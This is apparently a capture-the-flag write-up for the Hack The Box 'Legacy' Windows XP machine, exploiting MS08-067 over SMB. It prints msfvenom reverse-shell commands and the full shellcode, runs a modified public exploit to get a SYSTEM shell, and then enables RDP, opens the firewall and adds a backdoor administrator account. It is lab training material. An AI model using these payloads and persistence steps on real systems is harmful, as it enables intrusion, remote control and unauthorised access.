@@ -1,0 +1,476 @@
+I"Mv<p>Walkthrough for LEGACY - 10.10.10.4</p>
+
+<h2 id="overview">Overview</h2>
+
+<p>This is the second box on the HTB platform, this walkthrough has a straight to root exploit from a searchsploit rework of an exploit on metasploit.</p>
+
+<h3 id="tools-used">Tools Used</h3>
+
+<p>No special requirments, I used the following stock tools from Kali:</p>
+
+<ol>
+  <li>nmap</li>
+  <li>searchsploit</li>
+  <li>metasploit - BONUS Section</li>
+</ol>
+
+<h2 id="recon">Recon</h2>
+
+<p>First we assign the ip addresses to a local variables:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TARGET</span><span class="o">=</span>10.10.10.4
+<span class="nv">ATTACK</span><span class="o">=</span>10.10.14.34
+</code></pre></div></div>
+
+<p>First we run the nmap scan to identify the running services:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nv">$TARGET</span> <span class="nt">-Pn</span>
+</code></pre></div></div>
+
+<p>We get the output:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.4
+Host is up (0.046s latency).
+Not shown: 997 filtered ports
+PORT     STATE  SERVICE
+139/tcp  open   netbios-ssn
+445/tcp  open   microsoft-ds
+3389/tcp closed ms-wbt-server
+</code></pre></div></div>
+
+<p>Immediately, this box looks like a windows box, port 3389 is typically used for Windows RDP and ports 139 and 445 suggest SMB.</p>
+
+<p>RDP is the TCP service windows uses to allow remote login. RDP traditionally has a few isues that we can exploit but is typically a slow system to attack with no prior credentials.</p>
+
+<p>SMB uses either IP port 139 or 445. SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transport layer that allows Windows computers to talk to each other on the same network. Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack which allows SMB to work over the internet. The supporting ports 137 on UDP and TCP (name service) and 138 on UDP (datagram) are used for NetBIOS on the WinTEL stack. SMB has been plagued with issues, if we find an older version here we could be on to an easy win.</p>
+
+<p>Let’s kick it up a notch and go into a targeted aggressive scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nv">$TARGET</span> <span class="nt">-Pn</span> <span class="nt">-p</span> U:137,138,3389,T:137,139,445,3389 <span class="nt">-A</span>
+</code></pre></div></div>
+<p>gives us more verbose reading</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.4
+Host is up (0.038s latency).
+
+PORT     STATE    SERVICE       VERSION
+137/tcp  filtered netbios-ns
+139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open     microsoft-ds  Windows XP microsoft-ds
+3389/tcp closed   ms-wbt-server
+Device type: general purpose|specialized
+Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (89%)
+OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
+Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows XP SP2 or Windows Server 2003 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_clock-skew: mean: 5d00h26m23s, deviation: 2h07m16s, median: 4d22h56m23s
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:a1:3f (VMware)
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+|_  System time: 2018-02-05T23:31:26+03:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE (using port 3389/tcp)
+HOP RTT      ADDRESS
+1   41.03 ms 10.10.14.1
+2   41.10 ms 10.10.10.4
+
+</code></pre></div></div>
+
+<p>Time for some triage.</p>
+
+<h2 id="weaponisation">Weaponisation</h2>
+
+<p>Looking at SMB I can see the version looks like smb2 on Windows, maybe Windows XP.
+There are alot of potential exploits that pop up if we run a <code class="highlighter-rouge">searchsploit smb windows</code> so lets try to narrow the field a bit with more scanning. Nmap has a number of microsoft vulnerablity checks included in it’s engine that all start with <em>smb-vuln-</em>, lets try and see what we can find:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nv">$TARGET</span> <span class="nt">-Pn</span> <span class="nt">-p</span> 139,445 <span class="nt">--script</span><span class="o">=</span>smb-vuln-<span class="k">*</span>
+</code></pre></div></div>
+
+<p>Interesting we get the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.4
+Host is up (0.037s latency).
+Not shown: 997 filtered ports
+PORT     STATE  SERVICE
+139/tcp  open   netbios-ssn
+445/tcp  open   microsoft-ds
+3389/tcp closed ms-wbt-server
+
+Host script results:
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+Nmap done: 1 IP address (1 host up) scanned in 9.86 seconds
+
+</code></pre></div></div>
+
+<p>Looks like 2 winners:</p>
+
+<ol>
+  <li>smb-vuln-ms08-067</li>
+  <li>smb-vuln-ms17-010</li>
+</ol>
+
+<p>We’ll look at smb-vuln-ms08-067 first as smb-vuln-ms17-010 carries high risk.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit ms08-067
+</code></pre></div></div>
+
+<p>There are a few to choose from:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                               |  Path
+                                                                                                             | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067)                                        | exploits/windows/remote/40279.py
+Microsoft Windows Server - Code Execution (MS08-067)                                                         | exploits/windows/remote/7104.c
+Microsoft Windows Server - Code Execution (PoC) (MS08-067)                                                   | exploits/windows/dos/6824.txt
+Microsoft Windows Server - Service Relative Path Stack Corruption (MS08-067) (Metasploit)                    | exploits/windows/remote/16362.rb
+Microsoft Windows Server - Universal Code Execution (MS08-067)                                               | exploits/windows/remote/6841.txt
+Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)                                               | exploits/windows/remote/7132.py
+------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+------------------------------------------------------------------------------------------------------ -----------------------------------------------
+ Paper Title                                                                                          |  Path
+                                                                                                      | (/usr/share/exploitdb-papers/)
+------------------------------------------------------------------------------------------------------ -----------------------------------------------
+How Conficker makes use of MS08-067                                                                   | docs/english/12934-how-conficker-makes-use-of-
+------------------------------------------------------------------------------------------------------ -----------------------------------------------
+</code></pre></div></div>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>With the metasploit script available, this looks like a point and shoot exploit. Lets try a bit harder and run a manual attack this time. Lets check out the first one on the list:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit 40279.py <span class="nt">-x</span>
+</code></pre></div></div>
+
+<p>Combing through the code this looks like a mature exploit, it is a python rework of <a href="https://www.exploit-db.com/exploits/7132/">7132.py</a> also on the list.</p>
+
+<p>I run a mirror copy to my current directory:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit 40279.py <span class="nt">-m</span>
+</code></pre></div></div>
+
+<p>When we attempt a re-write of a manual exploit we need to have a good idea that the exploit is compatible with our target and that there are no errors. Glancing through this it looks like the author has made consession for different OS versions and languages. As our nmap script is favoring XP it looks like option 1 is the good option on line 204:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="s">'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal</span><span class="se">\n</span><span class="s">'</span>
+</code></pre></div></div>
+
+<p>Lines 79 to 179 appears to be the exploit code for a Buffer Overflow against the SMB service. At this stage we don’t care about that. If we make the assumption that the exploit works, we only care about triggering malicious code to work with our setup. This code is executed in the shellcode variable.</p>
+
+<p>line 45 explains how this is generated with the msfvenom tool:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
+</span></code></pre></div></div>
+
+<p>The output of this is said to be 380 bytes as per line 43 and this doesn’t include the required nop slide to trigger.</p>
+
+<p>But what does the tool actually do? In this case it generates a meterpreter reverse tcp shell payload for Windows. The reverse shell is sent to host 192.168.30.77 on port 443. The author has specified a thread EXITFUNC which allows the payload to execute the shellcode in a sub-thread helping the service recover should we exit. the -b flag highlights the bad characters we want to avoid in the exploit buffer and we specify a python format.</p>
+
+<p>A thing to be aware of is that a lot of public exploit code has errors in it, some of it will even brick your machine because people are bad that way. So lets check the payload for ourselves by running the msfvenom command above:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
+Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+x86/call4_dword_xor succeeded with size 388 (iteration=0)
+x86/call4_dword_xor chosen with final size 388
+Payload size: 388 bytes
+Final size of python file: 1862 bytes
+
+# payload redacted
+</code></pre></div></div>
+
+<p>Note the payload size is 388 bytes, not 380 as advertised. This is a little worring but we can press forward with our own smaller windows reverse shell payload:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
+</code></pre></div></div>
+
+<p>Payload size is now 348 bytes, 32 lower than the original exploit now lets consider the nopslide.
+The \x90 operation corresponds to a NOP (No Operation) value in the shellcode variable.</p>
+
+<p>Counting through the value we see 47 \x90s in the code and another issue, the shellcode variable re-declares itself on lines 46-48:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span><span class="o">=</span><span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span> <span class="c1">#first decleration
+</span><span class="n">shellcode</span><span class="o">=</span><span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span> <span class="c1">#second decleration
+</span><span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span> <span class="c1">#first append, rest of code is as expected.
+</span></code></pre></div></div>
+
+<p>We’ll assume the exploit needs 380 bytes and err on the side of caution and assume the exploit worked as submitted go with an orignal NOP sled size of 30 bytes meaning that when we include the additional 32 bytes for our shellcode reduction we need an additional 62 bytes giving us the following command to generate the shellcode:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -n 62
+</code></pre></div></div>
+
+<p>gives us:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
+Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+x86/call4_dword_xor succeeded with size 348 (iteration=0)
+x86/call4_dword_xor chosen with final size 348
+Successfully added NOP sled of size 62 from x86/single_byte
+Payload size: 410 bytes
+Final size of python file: 2216 bytes
+shellcode =  ""
+shellcode += "\x92\x92\x48\xf8\xf5\x98\x98\x3f\xf9\x27\xf5\x48"
+shellcode += "\x27\x43\x99\x98\x27\x92\x42\x9f\x48\xfc\x27\xf9"
+shellcode += "\x3f\x49\x37\x98\x93\x42\x49\x49\x4b\xd6\x9f\x48"
+shellcode += "\x43\x48\x9b\x91\xfc\xf9\xf9\x92\x91\xf9\x27\x98"
+shellcode += "\x41\xd6\x42\x91\xf8\x41\xfc\x9b\x3f\x90\xfd\xf9"
+shellcode += "\x98\x42\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff"
+shellcode += "\xc0\x5e\x81\x76\x0e\x66\xf8\x2a\xc8\x83\xee\xfc"
+shellcode += "\xe2\xf4\x9a\x10\xa8\xc8\x66\xf8\x4a\x41\x83\xc9"
+shellcode += "\xea\xac\xed\xa8\x1a\x43\x34\xf4\xa1\x9a\x72\x73"
+shellcode += "\x58\xe0\x69\x4f\x60\xee\x57\x07\x86\xf4\x07\x84"
+shellcode += "\x28\xe4\x46\x39\xe5\xc5\x67\x3f\xc8\x3a\x34\xaf"
+shellcode += "\xa1\x9a\x76\x73\x60\xf4\xed\xb4\x3b\xb0\x85\xb0"
+shellcode += "\x2b\x19\x37\x73\x73\xe8\x67\x2b\xa1\x81\x7e\x1b"
+shellcode += "\x10\x81\xed\xcc\xa1\xc9\xb0\xc9\xd5\x64\xa7\x37"
+shellcode += "\x27\xc9\xa1\xc0\xca\xbd\x90\xfb\x57\x30\x5d\x85"
+shellcode += "\x0e\xbd\x82\xa0\xa1\x90\x42\xf9\xf9\xae\xed\xf4"
+shellcode += "\x61\x43\x3e\xe4\x2b\x1b\xed\xfc\xa1\xc9\xb6\x71"
+shellcode += "\x6e\xec\x42\xa3\x71\xa9\x3f\xa2\x7b\x37\x86\xa7"
+shellcode += "\x75\x92\xed\xea\xc1\x45\x3b\x90\x19\xfa\x66\xf8"
+shellcode += "\x42\xbf\x15\xca\x75\x9c\x0e\xb4\x5d\xee\x61\x07"
+shellcode += "\xff\x70\xf6\xf9\x2a\xc8\x4f\x3c\x7e\x98\x0e\xd1"
+shellcode += "\xaa\xa3\x66\x07\xff\x98\x36\xa8\x7a\x88\x36\xb8"
+shellcode += "\x7a\xa0\x8c\xf7\xf5\x28\x99\x2d\xbd\xa2\x63\x90"
+shellcode += "\x20\xc2\x68\xda\x42\xca\x66\xf9\x91\x41\x80\x92"
+shellcode += "\x3a\x9e\x31\x90\xb3\x6d\x12\x99\xd5\x1d\xe3\x38"
+shellcode += "\x5e\xc4\x99\xb6\x22\xbd\x8a\x90\xda\x7d\xc4\xae"
+shellcode += "\xd5\x1d\x0e\x9b\x47\xac\x66\x71\xc9\x9f\x31\xaf"
+shellcode += "\x1b\x3e\x0c\xea\x73\x9e\x84\x05\x4c\x0f\x22\xdc"
+shellcode += "\x16\xc9\x67\x75\x6e\xec\x76\x3e\x2a\x8c\x32\xa8"
+shellcode += "\x7c\x9e\x30\xbe\x7c\x86\x30\xae\x79\x9e\x0e\x81"
+shellcode += "\xe6\xf7\xe0\x07\xff\x41\x86\xb6\x7c\x8e\x99\xc8"
+shellcode += "\x42\xc0\xe1\xe5\x4a\x37\xb3\x43\xca\xd5\x4c\xf2"
+shellcode += "\x42\x6e\xf3\x45\xb7\x37\xb3\xc4\x2c\xb4\x6c\x78"
+shellcode += "\xd1\x28\x13\xfd\x91\x8f\x75\x8a\x45\xa2\x66\xab"
+shellcode += "\xd5\x1d"
+</code></pre></div></div>
+
+<p>After replacing the shellcode variable in the exploit with the one we generated, we can set up a reverse shell with nc:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvlp</span> 443
+</code></pre></div></div>
+
+<p>In a seperate terminal window we can launch the exploit, but before we do we need to consider the runtime arguments. As per the example in line 208 the syntax is <code class="highlighter-rouge">&lt;script&gt; &lt;target&gt; &lt;target os&gt;</code> like so:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="s">'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal</span><span class="se">\n</span><span class="s">'</span>
+</code></pre></div></div>
+
+<p>Checking through the source code we see the numbers correspond to different OS versions which will select appropriate return addresses for our exploit to run.</p>
+
+<p>Going back to our aggressive nmap scan we can determine the target OS is <strong>Microsoft Windows XP SP3 (94%)</strong>
+ which is option 6 (line 149) offers the closest match to.</p>
+
+<p>to run the exploit we use:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 40279.py <span class="nv">$TARGET</span> 6
+</code></pre></div></div>
+
+<p>this appears to run the exploit successfuly:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#######################################################################
+#   MS08-067 Exploit
+#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
+#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
+#######################################################################
+
+Windows XP SP3 English (NX)
+
+[-]Initiating connection
+[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
+Exploit finish
+
+</code></pre></div></div>
+
+<p>After a moment we have a system shell in the other terminal:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on [any] 443 ...
+connect to [10.10.14.34] from (UNKNOWN) [10.10.10.4] 1031
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32&gt;
+
+</code></pre></div></div>
+
+<p>Early Windows XP doesn’t have whoami, lets check who we are:</p>
+
+<pre><code class="language-cmd">echo %computername%\%username%
+</code></pre>
+
+<p>gives us</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LEGACY\%username%
+
+</code></pre></div></div>
+
+<p>Looks like there is no %username% variable for this user, I think we might be system.
+When I check for the root flag, I can find it I can grab the flags and submit.</p>
+
+<p>W00tW00t!</p>
+
+<h2 id="value-extraction">Value Extraction</h2>
+
+<p>At this point I can grab both flags:</p>
+
+<h3 id="getting-user">Getting User</h3>
+
+<pre><code class="language-cmd">type "C:\Documents and Settings\john\Desktop\user.txt"
+xxxxxxxxxxxxxxxxxxxx6fda4ec7644f
+</code></pre>
+
+<h3 id="getting-root">Getting Root</h3>
+
+<pre><code class="language-cmd">type "C:\Documents and Settings\Administrator\Desktop\root.txt"
+xxxxxxxxxxxxxxxxxxxxae9e695d5713
+</code></pre>
+
+<p>type “C:\Documents and Settings\john\Desktop\user.txt”</p>
+
+<h2 id="bonus">Bonus</h2>
+
+<h3 id="msfconsole">msfconsole</h3>
+
+<p>With the removal of python 2 support we can look at either a python3 re-work <em>or</em> metasploit module:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msf5</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">ms08_067_netapi</span>
+
+<span class="no">Matching</span> <span class="no">Modules</span>
+<span class="o">================</span>
+
+   <span class="c1">#  Name                                 Disclosure Date  Rank   Check  Description</span>
+   <span class="o">-</span>  <span class="o">----</span>                                 <span class="o">---------------</span>  <span class="o">----</span>   <span class="o">-----</span>  <span class="o">-----------</span>
+   <span class="mi">0</span>  <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span>  <span class="mi">2008</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">28</span>       <span class="n">great</span>  <span class="no">Yes</span>    <span class="no">MS08</span><span class="o">-</span><span class="mo">067</span> <span class="no">Microsoft</span> <span class="no">Server</span> <span class="no">Service</span> <span class="no">Relative</span> <span class="no">Path</span> <span class="no">Stack</span> <span class="no">Corruption</span>
+
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Using</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span>
+<span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="no">RHOSTS</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.4</span>
+<span class="no">RHOSTS</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.4</span>
+<span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>
+
+<span class="no">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span><span class="p">):</span>
+
+   <span class="no">Name</span>     <span class="no">Current</span> <span class="no">Setting</span>  <span class="no">Required</span>  <span class="no">Description</span>
+   <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+   <span class="no">RHOSTS</span>   <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.4</span>       <span class="n">yes</span>       <span class="no">The</span> <span class="n">target</span> <span class="n">host</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">range</span> <span class="no">CIDR</span> <span class="n">identifier</span><span class="p">,</span> <span class="n">or</span> <span class="n">hosts</span> <span class="n">file</span> <span class="n">with</span> <span class="n">syntax</span> <span class="s1">'file:&lt;path&gt;'</span>
+   <span class="no">RPORT</span>    <span class="mi">445</span>              <span class="n">yes</span>       <span class="no">The</span> <span class="no">SMB</span> <span class="n">service</span> <span class="n">port</span> <span class="p">(</span><span class="no">TCP</span><span class="p">)</span>
+   <span class="no">SMBPIPE</span>  <span class="no">BROWSER</span>          <span class="n">yes</span>       <span class="no">The</span> <span class="n">pipe</span> <span class="nb">name</span> <span class="n">to</span> <span class="n">use</span> <span class="p">(</span><span class="no">BROWSER</span><span class="p">,</span> <span class="no">SRVSVC</span><span class="p">)</span>
+
+
+<span class="no">Exploit</span> <span class="ss">target:
+
+   </span><span class="no">Id</span>  <span class="no">Name</span>
+   <span class="o">--</span>  <span class="o">----</span>
+   <span class="mi">0</span>   <span class="no">Automatic</span> <span class="no">Targeting</span>
+
+
+<span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+</code></pre></div></div>
+
+<h3 id="getting-rdp">Getting RDP.</h3>
+
+<p>Remeber RDP from earlier? Now that I have system access lets get a full RDP session for the lolz.</p>
+
+<p>Checking back to our port scan with nmap I see that 3389 is closed, we need to open it and potentially set a couple of reg keys to get access. As system we also do not have a password to login with, we will need to take of that as well.</p>
+
+<p>First lets take care of the RDP, by explicitly enabling the service (stricly not required here, but useful reference)</p>
+
+<pre><code class="language-cmd">reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v Netsh.exe
+</code></pre>
+
+<p>outputs</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The operation completed successfully
+
+</code></pre></div></div>
+
+<p>Disable the deny connections:</p>
+
+<pre><code class="language-cmd">reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+</code></pre>
+
+<p>and for good measure poke a hole in the firewall:</p>
+
+<pre><code class="language-cmd">netsh firewall add portopening TCP 3389 " Remote Desktop"
+</code></pre>
+
+<p>works with the output:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ok.
+</code></pre></div></div>
+
+<p>back to our original linux terminal we check the changes with rdp:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop <span class="nv">$TARGET</span>
+</code></pre></div></div>
+
+<p>It worked!</p>
+
+<p><img src="/assets/htb_stuff/legacy/legacy_rdp.png" alt="legacy_rdp.png" /></p>
+
+<p>Now for a login. As system we can do back to our shell just create an admin user and password with the following 2 lines of code:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user pwnd Pa$$w0rd /ADD
+net localgroup administrators pwnd /add
+</code></pre></div></div>
+
+<p>which we can login with:</p>
+
+<p><img src="/assets/htb_stuff/legacy/pwnd.png" alt="pwnd.png" /></p>
+
+<p>And it is PWND!</p>
+:ET
